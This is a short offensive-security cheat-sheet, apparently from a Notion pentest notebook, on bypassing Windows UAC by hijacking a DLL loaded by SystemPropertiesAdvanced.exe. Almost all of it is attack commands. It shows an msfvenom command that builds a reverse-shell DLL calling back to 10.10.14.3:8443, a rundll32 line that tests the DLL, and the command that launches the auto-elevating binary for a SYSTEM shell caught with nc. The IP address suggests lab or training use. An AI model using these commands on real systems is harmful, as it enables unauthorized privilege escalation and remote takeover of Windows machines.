# UAC Bypass: SystemPropertiesAdvanced.exe

OS: Windows
Description: UAC Bypass: Place .dll in the PATH and run SystemPropertiesAdvanced.exe
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### UAC SystemPropertiesAdvanced.exe technique

- Generate the .dll below
- Place it in the path

```jsx
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

- Run it. (This would just be to test.)
    - Normal User Priv

```jsx
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

- Start the Executable
    - Listen for the system level shell with nc

```jsx
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```